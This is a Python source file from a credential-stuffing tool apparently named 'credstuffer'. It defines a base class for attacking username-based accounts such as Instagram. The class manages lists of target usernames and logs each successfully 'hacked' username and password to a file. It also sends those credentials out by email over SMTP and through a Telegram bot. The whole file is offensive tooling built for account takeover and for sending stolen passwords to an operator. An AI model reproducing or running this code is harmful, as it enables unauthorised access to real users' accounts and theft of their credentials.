import logging
from abc import abstractmethod
from time import sleep

from credstuffer import Account
from credstuffer.notification import Mail, CredstufferTelegram


class UserAccount(Account):
    """ Base class UserAccount to provide basic methods for accounts with username accounts

    USAGE:
            useracc = UserAccount(name="Instagram",notify=notify, **kwargs)
            useracc.send_notification(username="abc", password="test")
    """

    def __init__(self, name=None, notify=None, token=None, **kwargs):
        self.logger = logging.getLogger('credstuffer')
        self.logger.info('create class UserAccount')

        # init base class
        super().__init__()

        self.name = name
        self.notify = notify

        self.credential_file = self.filename + self.name
        self.mail = None
        self.credstuffer_telegram = None

        if self.notify is not None:
            if 'mail' in self.notify:

                if ( ('smtp' and 'port' and 'sender' and 'receiver' and 'password') in kwargs.keys() ) and \
                        all([val is not None for val in kwargs.values()]):
                    self.smtp = kwargs.get('smtp')
                    self.port = kwargs.get('port')
                    self.sender = kwargs.get('sender')
                    self.password = kwargs.get('password')
                    self.receiver = kwargs.get('receiver')
                    self.mail = Mail(smtp_server=kwargs.get('smtp'), port=kwargs.get('port'))
            if 'telegram' in self.notify:
                if token is not None:
                    self.token = token
                    self.credstuffer_telegram = CredstufferTelegram(token=self.token)
        else:
            self.logger.info("No credential notification configured")

        self.usernames = list()

    @abstractmethod
    def login(self, password):
        """ abstract method login

        :return: None or request Response
        """
        pass

    def set_usernames(self, usernames):
        """ sets usernames for instagram account

        :param usernames: list of usernames
        """
        self.logger.info("set usernames {}".format(usernames))
        if isinstance(usernames, list):
            self.usernames.extend(usernames)
        else:
            self.usernames.append(usernames)

    def remove_username(self, username):
        """ removes the given username from the usernames list

        :param username: username string
        """
        self.logger.info("Remove username {} from list".format(username))
        try:
            self.usernames.remove(username)
        except ValueError as ex:
            self.logger.error("Could not remove the username {} from list: {}".format(username, ex))

    def send_notification(self, username, password):
        """ saves and sends a notification in success case

        :param username: string username
        :param password: string password
        """
        try:
            with open(self.root_dir + '/' + self.credential_file + '.txt', 'a') as file:
                self.logger.info("writing credential (username: {}, password: {}) to file {}".format(username, password,
                                                                                                     self.credential_file))
                file.write("username: {}, password: {}\n".format(username, password))
        except PermissionError as e:
            self.logger.error("Could not create credential file! Error: {}".format(e))

        if self.mail is not None:
            self.mail.new_message()
            self.mail.set_subject("CREDSTUFFER: Credential Notification!")
            mail_content = "CREDSTUFFER has succesfully hacked credential from account {}\n\nUsername: {}\nPassword: {}"\
                           .format(self.name, username, password)
            self.mail.set_body(mail_content)
            self.logger.info("send credential mail: {}".format(mail_content))
            self.mail.send(username=self.sender, password=self.password, receiver=self.receiver)

        if self.credstuffer_telegram is not None:
            msg_content = "CREDSTUFFER has succesfully hacked credential from account {}\n\nUsername: *{}*\nPassword: *{}*"\
                           .format(self.name, username, password)
            self.credstuffer_telegram.new_msg(text=msg_content)
